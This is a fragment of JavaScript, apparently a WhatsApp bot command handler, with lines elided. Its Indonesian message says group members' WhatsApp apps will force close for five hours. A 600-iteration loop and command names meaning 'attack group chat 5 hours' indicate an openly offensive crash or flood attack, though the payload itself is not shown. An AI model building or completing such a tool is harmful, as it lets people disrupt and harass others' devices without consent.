...
Aplikasi WhatsApp Target Yang Ada Di dalam Grup Akan Force Close(Tidak Bisa di Buka) Selama 5 Jam Dari sekarang`)
for (let i = 0;i < 600;i++) {
...
handler.help = ['atkgc5jam']
handler.command = /^(atkgc5jam|santedgc5jam|seranggc5jam)$/i
